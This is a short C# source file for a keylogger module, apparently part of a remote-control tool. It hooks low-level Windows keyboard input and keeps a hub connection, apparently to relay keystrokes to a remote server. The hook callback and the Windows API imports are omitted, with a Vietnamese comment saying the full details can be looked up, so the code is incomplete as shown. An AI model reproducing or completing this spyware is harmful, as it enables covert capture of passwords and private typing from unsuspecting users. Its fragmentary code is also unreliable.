// Features/Keylogger.cs
using System.Runtime.InteropServices;

public static class Keylogger
{
    private static HubConnection _connection;
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;

    public static void Start(HubConnection connection)
    {
        _connection = connection;
        _hookID = SetHook(_proc);
    }

    public static void Stop()
    {
        UnhookWindowsHookEx(_hookID);
    }

    // Windows API Hook (chi tiết đầy đủ có thể tra thêm)
    // ... (dùng P/Invoke)
}